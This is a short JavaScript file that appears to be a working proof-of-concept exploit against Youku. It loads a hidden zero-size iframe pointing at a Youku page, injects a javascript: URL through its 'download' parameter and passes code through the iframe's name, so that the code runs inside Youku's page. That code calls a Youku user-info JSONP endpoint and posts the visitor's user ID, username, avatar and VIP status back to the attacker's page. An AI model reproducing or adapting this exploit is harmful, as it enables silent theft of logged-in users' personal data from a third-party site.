// 用户id 用户名  图像  是否是vip

function n(t) {
  console.log(t)
  if ('youku' === t.data.source) {
    var n = t.data.d
    if (0 === n.error) {
      var a = {
        valid: !0,
        data: {
          uid: (n = n.data).uid,
          username: n.username,
          avatar: n.avatar.large,
          is_vip: n.vip ? '是' : '否',
        },
      }

      let innerHTML = `
      <div class='item'>
        <p class='title'>优酷</p>
        <p>图像: ${a.data.avatar}</p>
        <p>用户名: ${a.data.userName}</p>
      </div>
    `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML
      document.getElementById('content').appendChild(dom)
      console.log(a)
    }
  }
}
function youku() {
  var e = document.createElement('iframe')
  e.src =
    'https://hudong.vip.youku.com/act/mili/download.html?mobile=1&download=javascript:new%20Function(name)();//https://down2.uc.cn///https://itunes.apple.com/app'
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.referrerPolicy = 'origin'
  e.name =
    '\n  window.getUserInfo = function(data) {let s = {source: \'youku\', d: data}; window.parent.postMessage(s, \'*\');}\nlet s = document.createElement("script");\ns.src = "https://cmstool.youku.com/cms/player/userinfo/user_info?callback=getUserInfo&t=" + new Date().getTime();\ndocument.documentElement.appendChild(s);\n  '
  document.documentElement.appendChild(e)
}
window.addEventListener('message', n, !1)
// window.addEventListener('load', function () {
youku()
// })
